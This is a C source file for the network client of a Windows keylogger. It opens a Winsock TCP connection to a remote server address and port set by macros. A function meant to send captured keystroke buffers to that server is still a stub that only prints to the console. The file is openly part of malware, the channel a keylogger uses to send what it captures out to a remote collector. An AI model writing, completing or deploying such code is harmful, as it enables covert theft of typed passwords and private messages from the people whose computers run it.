#include "KeyLogger_clientCom.h"

#include <stdio.h>
#include <winsock2.h>
WSADATA WSA;
SOCKET keylogServer;
 /**
    Name startListeningClient

    Description: enable the server to write to t he socket  by calling
    a WSASartup to enable SOCKET communication, then initiate
    the socket. if the socket is established this function should
    return true, else this function should return false.
*/
bool startListeningClient()
{
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2,2),&WSA) !=0)
    {
        return false;
    }
    keylogServer = socket(AF_INET,SOCK_STREAM,0);

    if (keylogServer == INVALID_SOCKET)
    {
        return false;
    }
    server.sin_port=htons(SERVER_CONNECTION_PORT);
    server.sin_family=AF_INET;
    server.sin_addr.S_un.S_addr = inet_addr(IP_ADDRESS);
    if (connect(keylogServer,(SOCKADDR*)&server,sizeof(server))<0)
    {
        return false;
    }
return true;
}
/**
    Mockup the writeToServer function for further development at this point it is limited
    but will be developed further.

    Title WriteToServer
*/

bool WriteToServer(char* buffer)
{
    printf("%s", buffer);
    return true;
}

